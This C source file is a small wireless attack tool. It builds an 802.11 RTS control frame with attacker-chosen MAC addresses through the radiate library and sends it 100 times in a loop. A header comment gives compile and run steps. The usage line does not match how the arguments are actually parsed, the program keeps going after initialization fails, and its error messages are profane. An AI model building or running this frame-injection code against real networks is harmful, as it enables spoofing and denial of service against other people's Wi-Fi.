/* by john lampe
compile with gcc -ofucknot fucknot.c -lradiate 

example, 
set_monitor.sh 1
set_channel.sh 11
./fucknot -b 00:01:02:03:04:05 destmac bssid srcmac 
*/

#include <errno.h>
#include <time.h>
#include <radiate.h>

#define RADIATE_CTRL_STYPE_PSP              0x0A
#define RADIATE_CTRL_STYPE_RTS              0x0B
#define RADIATE_CTRL_STYPE_CTS              0x0C
#define RADIATE_CTRL_STYPE_ACK              0x0D
#define RADIATE_CTRL_STYPE_CF_END           0x0E
#define RADIATE_CTRL_STYPE_CFEND_CFACK      0x0F

#define mynull 0x00

// function prototypes
u_char * libnet_hex_aton(char *s, int *len);
u_char * radiate_build_ctrl_frame(u_char *addr1, u_char *addr2, u_char *addr3, u_char subtype, u_char control, radiate_t *r);

int main (int argc, char **argv) {
    radiate_t *context;
    char errbuff[1024];
    u_char *frame;
    int x,unused,c;
    u_char *bssid;
    u_char *dstmac;
    u_char *srcmac;
   
    bssid=libnet_hex_aton(argv[1],&unused);
    srcmac=libnet_hex_aton(argv[2],&unused);
    dstmac=libnet_hex_aton(argv[3],&unused);
    

    context = radiate_init (0 , errbuff);
    if (context==NULL) {
        fprintf(stderr, "you fuck-dip...you screwed up radiate_init\n");
    }

    frame = radiate_build_ctrl_frame(bssid,dstmac,srcmac,RADIATE_CTRL_STYPE_RTS,mynull,context);
    for (x=0; x < 100; x += 1) { 
        c = radiate_write(frame, sizeof(struct hfa384x_tx_frame), context);
        if (c == -1) { 
            fprintf (stderr, "dip shit...radiate_write error\n");
        } else {
            fprintf (stderr, "%d bytes sent\n", c);
        }
    }
    return 1;
}


u_char *
radiate_build_ctrl_frame(u_char *addr1, u_char *addr2, u_char *addr3,
            u_char subtype, u_char control, radiate_t *r) 
{
    struct hfa384x_tx_frame tx;
    u_char *buf;

    /* XXX - this needs to get free()'d */
    buf = malloc(sizeof(tx));
    if (buf == NULL)
    {
        snprintf(r->err_buf, RADIATE_ERRBUF_SIZE, "malloc(): %s\n",
                strerror(errno));
        return (NULL);
    }
    
    memcpy(&tx.addr1, addr1, 6);
    memcpy(&tx.addr2, addr2, 6);
    memcpy(&tx.addr3, addr3, 6);
    tx.frame_control = host_to_le16((WLAN_FC_TYPE_CTRL << 2) |
                                      (subtype << 4) | (control << 8));
    tx.status = 0;
    tx.reserved1 = 0;
    tx.reserved2 = 0;
    tx.retry_count = 0;
    tx.tx_control = host_to_le16(HFA384X_TX_CTRL_802_11 |
                                    HFA384X_TX_CTRL_TX_EX |
                                    HFA384X_TX_CTRL_TX_OK);
    tx.data_len = 0;
    tx.tx_rate = 0;
 
    memcpy(buf, &tx, sizeof (tx));

    return (buf);
}



u_char *
libnet_hex_aton(char *s, int *len)
{
    u_char *buf;
    int i;
    long l;
    char *pp;
    while (isspace(*s))
    {
        s++;
    }
    for (i = 0, *len = 0; s[i]; i++)
    {
        if (s[i] == ':')
        {
            (*len)++;
        }
    }
    buf = malloc(*len + 1);
    if (buf == NULL)
    {
        return (NULL);
    }
    /* expect len hex octets separated by ':' */
    for (i = 0; i < *len + 1; i++)
    {
        l = strtol(s, &pp, 16);
        if (pp == s || l > 0xFF || l < 0)
        {
            *len = 0;
            free(buf);
            return (NULL);
        }
        if (!(*pp == ':' || (i == *len && (isspace(*pp) || *pp == '\0'))))
        {
            *len = 0;
            free(buf);
            return (NULL);
        }
        buf[i] = (u_char)l;
        s = pp + 1;
    }
    /* return character after the octets ala strtol(3) */
    (*len)++;
    return (buf);
}

